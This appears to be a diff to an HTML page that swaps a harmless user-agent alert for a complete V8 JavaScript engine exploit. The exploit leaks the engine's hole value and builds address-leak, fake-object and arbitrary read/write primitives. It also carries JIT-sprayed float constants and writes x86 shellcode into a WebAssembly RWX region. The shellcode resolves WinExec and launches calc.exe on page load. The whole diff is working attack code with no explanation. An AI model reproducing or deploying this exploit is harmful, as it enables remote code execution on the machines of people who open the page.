@@ -1,3 +1,466 @@
 <script>
-  alert(navigator.userAgent);
-</script>
+  const FIXED_ARRAY_HEADER_SIZE = 8n;
+  
+  var buf = new ArrayBuffer(16);
+  var f64 = new Float64Array(buf);
+  var u32 = new Uint32Array(buf);
+  
+  var dv = new DataView(buf);
+  
+  function f2i(val)
+  {
+  dv.setFloat64(0,val,true);
+  return dv.getBigUint64(0,true);
+  }
+  
+  function i2f(val)
+  {
+  dv.setBigUint64(0,BigInt(val),true);
+  return dv.getFloat64(0,true);
+  }
+  
+  function f2half(f)
+  {
+  f64[0] = f;
+  let tmp = Array.from(u32);
+  return tmp;
+  }
+  
+  function half2f(val)
+  {
+  u32.set(val);
+  return f64[0];
+  }
+  
+  function p64f(high,low){
+  dv.setUint32(0,high,true);
+  dv.setUint32(4,low,true);
+  return dv.getFloat64(0,true);
+  }
+  
+  function ByteToBigIntArray(payload)
+  {
+  
+  let sc = []
+  let tmp = 0n;
+  let lenInt = BigInt(Math.floor(payload.length/8))
+  for (let i = 0n; i < lenInt; i += 1n) {
+      tmp = 0n;
+      for(let j=0n; j<8n; j++){
+          tmp += BigInt(payload[i*8n+j])*(0x1n<<(8n*j));
+      }
+      sc.push(tmp);
+  }
+  
+  let len = payload.length%8;
+  tmp = 0n;
+  for(let i=0n; i<len; i++){
+      tmp += BigInt(payload[lenInt*8n+i])*(0x1n<<(8n*i));
+  }
+  sc.push(tmp);
+  return sc;
+  }
+  
+  function hex(i){
+  return "0x"+i.toString(16).padStart(16,"0");
+  }
+  
+  // const foo = ()=>
+  // {
+  //     return [1.0,
+  //         1.95538254221075331056310651818E-246,
+  //         1.95606125582421466942709801013E-246,
+  //         1.99957147195425773436923756715E-246,
+  //         1.95337673326740932133292175341E-246,
+  //         2.63486047652296056448306022844E-284];
+  // }
+  const foo = ()=>
+  {
+      return [
+          1.0,
+          1.97128800932264e-246,
+          1.9710251538487089e-246,//占位1 20
+  1.9535165331756856e-246,
+  1.9711831786218553e-246,
+  1.9711302582276649e-246,//mov rdx,rdx+60h，这一行后面加一个mov rdx,rdx+18h
+  1.971182386370243e-246,//增加完毕
+  1.9711824204694007e-246,//替换qword from dword
+  1.971182625597146e-246,
+  1.9711062190503973e-246,
+  1.9844872658808452e-246,
+  1.9710442338776101e-246,//占位2 200
+  1.9346517240445797e-246,
+  1.9539187092919419e-246,//占位3 240
+  1.9398291100944961e-246,
+  1.9889043320213015e-246,
+  5.4347192807448249e-232,//需要更换跳转到+3的位置 300
+  5.5483866078232455e-232,//test rax, rax 占位4 323
+  5.4347193054904659e-232,
+  5.5483858407041602e-232,
+  5.548386599938718e-232,
+  5.5483852580972086e-232,
+  5.5483866085489296e-232,
+  5.5483866082450352e-232,//占位5替换指令 test   rcx,rcx 461
+  5.4347192989761578e-232,
+  5.5483866082673696e-232,
+  5.5483865052825693e-232,
+  5.5929115874408499e-232,
+  5.5483869437399541e-232,
+  5.5483850365737534e-232,
+  5.548386607845941e-232,
+  5.5483866055903481e-232,//占位6替换指令：622 cmp al,ah
+  5.5483866055790415e-232,
+  5.5479675990708206e-232,
+  5.5483866086060441e-232,//占位7：691
+  5.6360051602057723e-232,
+  5.5483866055757255e-232,
+  5.5483853060875066e-232,
+  5.5485814548559491e-232,
+  5.5481638823537202e-232,
+  5.5483852101069105e-232,
+  5.5483873667057662e-232,
+  5.548386503033024e-232,
+  5.5482136635123504e-232,
+  5.5482200888855405e-232,
+  5.5056845587187283e-232,
+  5.4993936985335533e-232,
+  5.5057579849776769e-232,
+  5.5483865996697425e-232,
+  5.5487288654373309e-232,//占位8 1059
+  5.548387392950241e-232,
+  5.5483866079393109e-232,
+  5.5479425928156816e-232,// lea     rcx,[rbp+0x57a]
+  5.5483866055757276e-232,
+  5.5479429440804607e-232,
+  5.5412087282453567e-232,
+  5.5483866055884766e-232,
+  5.5482086832973947e-232,
+  5.5587464282218089e-232,
+  5.4667737614685567e-232,
+  5.5483856568047451e-232,//占位9 1289
+  5.5480699333653622e-232,//占位10 
+  5.5482848842675359e-232,
+  5.6065483607039769e-232,
+  5.5483866088298074e-232,//mov movsxd替换 1381
+  9.5545979395580963e-307
+      ];
+  }
+  for (let i = 0; i < 0x10000; i++) {
+      foo();foo();foo();foo();
+  }
+  const f_x = () => 123;
+  
+  var arr_buf = new ArrayBuffer(8);
+  var f64_arr = new Float64Array(arr_buf);
+  var b64_arr = new BigInt64Array(arr_buf);
+  
+  function ftoi(f) {
+      f64_arr[0] = f;
+      return b64_arr[0];
+  }
+  
+  function itof(i) {
+      b64_arr[0] = BigInt(i);
+      return f64_arr[0];
+  }
+  
+  function smi(i) {
+      return i << 1n;
+  }
+  
+  
+  function gc_minor() { //scavenge
+      for(let i = 0; i < 1000; i++) {
+          new ArrayBuffer(0x10000);
+      }
+  }
+  
+  function gc_major() { //mark-sweep
+      new ArrayBuffer(0x7fe00000);
+  }
+  
+  
+  function set_keyed_prop(arr, key, val) {
+      arr[key] = val;
+  }
+  
+  function leak_hole() {
+      let store_mode = []; //STORE_AND_GROW_HANDLE_COW
+  
+      const IC_WARMUP_COUNT = 10;
+      for(let i = 0; i < IC_WARMUP_COUNT; i++) {
+          set_keyed_prop(arguments, "foo", 1);
+      }
+    
+      set_keyed_prop(store_mode, 0, 1);
+  
+      set_keyed_prop(arguments, arguments.length, 1);
+  
+      let hole = arguments[arguments.length+1];
+  
+      return hole;
+  }
+  const the = {};
+  var large_arr = new Array(0x10000);
+  large_arr.fill(itof(0xDEADBEE0n)); //change array type to HOLEY_DOUBLE_ELEMENTS_MAP
+  var fake_arr = null;
+  var fake_arr_addr = null;
+  var fake_arr_elements_addr = null;
+  
+  var packed_dbl_map = null;
+  var packed_dbl_props = null;
+  
+  var packed_map = null;
+  var packed_props = null;
+  
+  function leak_stuff(b) {
+      if(b) {
+          let index = Number(b ? the.hole : -1);
+          index |= 0;
+          index += 1;
+         
+          let arr1 = [1.1, 2.2, 3.3, 4.4];
+          let arr2 = [0x1337, large_arr];
+          
+          let packed_double_map_and_props = arr1.at(index*4);
+          let packed_double_elements_and_len = arr1.at(index*5);
+          
+          let packed_map_and_props = arr1.at(index*8);
+          let packed_elements_and_len = arr1.at(index*9);
+          
+          let fixed_arr_map = arr1.at(index*6);
+          
+          let large_arr_addr = arr1.at(index*7);
+  
+          return [
+              packed_double_map_and_props, packed_double_elements_and_len,
+              packed_map_and_props, packed_elements_and_len, 
+              fixed_arr_map, large_arr_addr, 
+              arr1, arr2
+          ];
+      }
+      return 0;
+  }
+  
+  function weak_fake_obj(b, addr=1.1) {
+      if(b) {
+          let index = Number(b ? the.hole : -1);
+          index |= 0;
+          index += 1;
+         
+          let arr1 = [0x1337, {}]
+          let arr2 = [addr, 2.2, 3.3, 4.4];
+          
+          let fake_obj = arr1.at(index*8);
+          
+          return [
+              fake_obj,
+              arr1, arr2
+          ];
+      }
+      return 0;
+  }
+  
+  function fake_obj(addr) {
+      large_arr[0] = itof(packed_map | (packed_dbl_props << 32n));
+      large_arr[1] = itof(fake_arr_elements_addr | (smi(1n) << 32n));
+      large_arr[3] = itof(addr | 1n);
+      
+      let result = fake_arr[0];
+      
+      large_arr[1] = itof(0n | (smi(0n) << 32n)); 
+      
+      return result;
+  }
+  
+  
+  function addr_of(obj) {
+      large_arr[0] = itof(packed_dbl_map | (packed_dbl_props << 32n));
+      large_arr[1] = itof(fake_arr_elements_addr | (smi(1n) << 32n));
+      
+      fake_arr[0] = obj;
+      let result = ftoi(large_arr[3]) & 0xFFFFFFFFn;
+      
+      large_arr[1] = itof(0n | (smi(0n) << 32n)); 
+      
+      return result;
+  }
+  
+  function v8_read64(addr) {
+      addr -= FIXED_ARRAY_HEADER_SIZE;
+      
+      large_arr[0] = itof(packed_dbl_map | (packed_dbl_props << 32n));
+      large_arr[1] = itof((addr | 1n) | (smi(1n) << 32n));
+      
+      let result = ftoi(fake_arr[0]);
+      
+      large_arr[1] = itof(0n | (smi(0n) << 32n)); 
+  
+      return result;    
+  }
+  
+  function v8_write64(addr, val) {
+      addr -= FIXED_ARRAY_HEADER_SIZE;
+      
+      large_arr[0] = itof(packed_dbl_map | (packed_dbl_props << 32n));
+      large_arr[1] = itof((addr | 1n) | (smi(1n) << 32n));
+      
+      fake_arr[0] = itof(val);
+      
+      large_arr[1] = itof(0n | (smi(0n) << 32n));   
+  }
+  
+  function install_primitives() {
+      
+      for(let i = 0; i < 0x20; i++) {
+          weak_fake_obj(true, 1.1);
+      }
+      for(let i = 0; i < 0x2000000; i++) {
+          weak_fake_obj(false, 1.1);
+      }
+      
+      for(let i = 0; i < 0x20; i++) {
+          leak_stuff(true);
+      }
+      for(let i = 0; i < 0x2000000; i++) {
+          leak_stuff(false);
+      }
+      try{
+        gc_minor();
+      gc_major();
+      }catch(error){
+        //alert(error.message);
+      }
+      
+      
+      let leaks = leak_stuff(true);
+      //%DebugPrint(leaks);
+      
+      let packed_double_map_and_props = ftoi(leaks[0]);
+      let packed_double_elements_and_len = ftoi(leaks[1]);
+      packed_dbl_map = packed_double_map_and_props & 0xFFFFFFFFn;
+      packed_dbl_props = packed_double_map_and_props >> 32n;
+      let packed_dbl_elements = packed_double_elements_and_len & 0xFFFFFFFFn;
+      
+      let packed_map_and_props = ftoi(leaks[2]);
+      let packed_elements_and_len = ftoi(leaks[3]);
+      
+      packed_map = packed_map_and_props & 0xFFFFFFFFn;
+      packed_props = packed_map_and_props >> 32n;
+      let packed_elements = packed_elements_and_len & 0xFFFFFFFFn;
+      
+      let fixed_arr_map = ftoi(leaks[4]) & 0xFFFFFFFFn;
+      
+      let large_arr_addr = ftoi(leaks[5]) >> 32n;
+      
+      let dbl_arr = leaks[6];
+      dbl_arr[0] = itof(packed_dbl_map | (packed_dbl_props << 32n));
+      dbl_arr[1] = itof(((large_arr_addr + 8n) - FIXED_ARRAY_HEADER_SIZE) | (smi(1n) << 32n));
+      
+      let temp_fake_arr_addr = (packed_dbl_elements + FIXED_ARRAY_HEADER_SIZE)|1n;
+      
+      // print("packed_dbl_map = " + packed_dbl_map.toString(16));
+      // print("packed_dbl_props = " + packed_dbl_props.toString(16));
+      // print("packed_dbl_elements = " + packed_dbl_elements.toString(16));
+      // print("packed_map = " + packed_map.toString(16));
+      // print("packed_props = " + packed_props.toString(16));
+      // print("packed_elements = " + packed_elements.toString(16));
+      // print("fixed_arr_map = " + fixed_arr_map.toString(16));
+      // print("large_arr = " + large_arr_addr.toString(16));
+      // print("[+] packed_map_and_props : 0x" + packed_map_and_props.toString());
+      // print("[+] packed_elements_and_len : 0x" + packed_elements_and_len.toString());
+      // %DebugPrint(leaks[7]);
+      // %SystemBreak();
+      //print("addr = " + ftoi(leaks[0]).toString(16));
+      //print("addr = " + ftoi(leaks[1]).toString(16));
+      //
+      //print("addr = " + ftoi(leaks[2]).toString(16));
+      //print("addr = " + ftoi(leaks[3]).toString(16));
+      //
+      //print("addr = " + ftoi(leaks[4]).toString(16));
+      //print("addr = " + ftoi(leaks[5]).toString(16));
+  
+      let temp_fake_arr = weak_fake_obj(true, itof(temp_fake_arr_addr));
+      let large_arr_elements_addr = ftoi(temp_fake_arr[0]) & 0xFFFFFFFFn;
+      fake_arr_addr = large_arr_elements_addr + FIXED_ARRAY_HEADER_SIZE;
+      fake_arr_elements_addr = fake_arr_addr + 16n;
+      
+      large_arr[0] = itof(packed_dbl_map | (packed_dbl_props << 32n));
+      large_arr[1] = itof(fake_arr_elements_addr | (smi(0n) << 32n));
+      large_arr[2] = itof(fixed_arr_map | (smi(0n) << 32n));
+  
+      fake_arr = weak_fake_obj(true, itof(fake_arr_addr))[0];
+      
+      temp_fake_arr = null;
+  }
+  
+  //*/
+  function pwn() {
+  
+      
+  
+      var buf1 = new ArrayBuffer(0x200);
+      var dataview1 = new DataView(buf1);
+  
+      the.hole = leak_hole();
+      alert(the.hole);
+      install_primitives();
+  
+      
+      let buf_addr = addr_of(buf1) & 0xffffffffn;;
+      // alert("[+]buf_addr : " + hex(buf_addr));
+      var backing_store = buf_addr+0x14n;
+      // alert("[+]backing_store : " + hex(backing_store));
+      var leak_addr = buf_addr+0x18n;
+      // alert("[+]leak_addr : " + hex(leak_addr));
+      var heap_addr = v8_read64(leak_addr+0x10n) & 0xffffffffn;
+      // alert("[+]heap_addr : " + hex(heap_addr));
+      var heap_d8_addr = v8_read64(heap_addr+0xcn) & 0xffffffffn;
+      // alert("[+]heap_d8_addr : " + hex(heap_d8_addr));
+      // var bss_addr = v8_read64(heap_d8_addr+0x1cn) & 0xffffffffn;
+      // alert("[+]bss_addr : " + hex(bss_addr));
+      // var d8_addr = v8_read64(bss_addr) & 0xffffffffn;
+      // alert("[+]d8_addr : " + hex(d8_addr));
+      var d8_base = heap_d8_addr - 0x7c103ffn;
+      // alert("[+]d8_base : " + hex(d8_base));
+      var flag_wasm_code_proetct = d8_base + 0x7daf184n;
+      // alert("[+]flag_wasm_code_proetct : " + hex(flag_wasm_code_proetct));
+      // var target_addr = d8_base + 0xfbb37an;
+      // alert("[+]target_addr : " + hex(target_addr));
+      var wasm_memory_protection_keys = d8_base + 0x7daf185n;
+      // alert("[+]wasm_memory_protection_keys : " + hex(wasm_memory_protection_keys));
+      // var write_protect_code_memory = d8_base + 0x183627fn;
+      // alert("[+]write_protect_code_memory : " + hex(write_protect_code_memory));
+  
+      // %DebugPrint(wasmInstance)
+      // alert("wtf"+i2f(0xceb90f0e48348e4n));
+      var test_sc = [0xceb90f0e48348fc,0xceb909090909090,0xceb515250415141,0xceb9090d2314856,0xceb9090d2314856,0xceb9060528b4865,0xceb909020528b48,0xceb909050728b48,0xceb904a4ab70f48,0xcebc03148c9314d,0xceb909090613cac,0xceb0dc9c141202c,0xceb52ebe2c10141,0xceb20528b485141,0xcebd001483c428b,0xceb00000088808b,0xceb906274c08548,0xceb909050d00148,0xceb90909018488b,0xceb909020408b44,0xceb9051e3d00149,0xceb909090c9ff48,0xceb909088348b41,0xcebc9314dd60148,0xceb9090acc03148,0xceb90900dc9c141,0xceb909090c10141,0xceb9090ee75e038,0xceb9008244c034c,0xceb58d375d13945,0xceb909024408b44,0xceb909090d00149,0xceb90480c8b4166,0xceb90901c408b44,0xceb909090d00149,0xceb909088048b41,0xceb905841d00148,0xceb905a595e5841,0xceb5a4159415841,0xceb524120ec8348,0xceb5a594158e0ff,0xceb909090128b48,0xceb90ffffff67e9,0xceb9090d231485d,0xceb909090c2ff48,0xceb9090714d8d48,0xceb909070c18348,0xceb909020c18348,0xceb876f8b31ba41,0xceb90909090d5ff,0xceb9056a2b5f0bb,0xceb9dbd95a6ba41,0xceb28c48348d5ff,0xceb9090047c063c,0xceb900275e0fb80,0xceb906f721347bb,0xcebda894159006a,0xceb906c618bd5ff,0xceb909090902e8b,0xceb909090906678];
+      // alert(test_sc.length);
+      // for(let i = 0;i < test_sc.length;i++)
+          // print(itof(test_sc[i])+",");
+      // %SystemBreak();
+    
+      var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,139,128,128,128,0,1,133,128,128,128,0,0,65,255,7,11]);
+      // // var wasmCode1 = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+  
+      var wasmModule = new WebAssembly.Module(wasmCode);
+      // // %SystemBreak();
+      // // wasmModule = new WebAssembly.Module(wasmCode1)
+      var wasmInstance = new WebAssembly.Instance(wasmModule, {});
+      var f = wasmInstance.exports.main;
+  
+      let instance_addr = addr_of(wasmInstance);
+      // // // %DebugPrint(buf1);
+      // alert("[+]wasm instance addr : " + hex(instance_addr));
+      let rwx_addr = v8_read64(instance_addr-1n+0x40n) & 0xffffffffn;
+      alert("[+]rwx_addr : " + hex(rwx_addr));
+      v8_write64(backing_store,rwx_addr);
+      var shellcode = [0x89,0xe5,0x83,0xec,0x20,0x31,0xdb,0x64,0x8b,0x5b,0x30,0x8b,0x5b,0x0c,0x8b,0x5b,0x1c,0x8b,0x1b,0x8b,0x1b,0x8b,0x43,0x08,0x89,0x45,0xfc,0x8b,0x58,0x3c,0x01,0xc3,0x8b,0x5b,0x78,0x01,0xc3,0x8b,0x7b,0x20,0x01,0xc7,0x89,0x7d,0xf8,0x8b,0x4b,0x24,0x01,0xc1,0x89,0x4d,0xf4,0x8b,0x53,0x1c,0x01,0xc2,0x89,0x55,0xf0,0x8b,0x53,0x14,0x89,0x55,0xec,0xeb,0x32,0x31,0xc0,0x8b,0x55,0xec,0x8b,0x7d,0xf8,0x8b,0x75,0x18,0x31,0xc9,0xfc,0x8b,0x3c,0x87,0x03,0x7d,0xfc,0x66,0x83,0xc1,0x08,0xf3,0xa6,0x74,0x05,0x40,0x39,0xd0,0x72,0xe4,0x8b,0x4d,0xf4,0x8b,0x55,0xf0,0x66,0x8b,0x04,0x41,0x8b,0x04,0x82,0x03,0x45,0xfc,0xc3,0xba,0x78,0x78,0x65,0x63,0xc1,0xea,0x08,0x52,0x68,0x57,0x69,0x6e,0x45,0x89,0x65,0x18,0xe8,0xb8,0xff,0xff,0xff,0x31,0xc9,0x51,0x68,0x2e,0x65,0x78,0x65,0x68,0x63,0x61,0x6c,0x63,0x89,0xe3,0x41,0x51,0x53,0xff,0xd0,0x31,0xc9,0xb9,0x01,0x65,0x73,0x73,0xc1,0xe9,0x08,0x51,0x68,0x50,0x72,0x6f,0x63,0x68,0x45,0x78,0x69,0x74,0x89,0x65,0x18,0xe8,0x87,0xff,0xff,0xff,0x31,0xd2,0x52,0xff,0xd0];
+      for(var i = 0; i < shellcode.length; i++) {
+          dataview1.setUint8(i, shellcode[i], true);
+      }
+      // alert("[+]rwx addr : " + hex(rwx_addr));
+      f();
+  }
+  pwn();
+  </script>
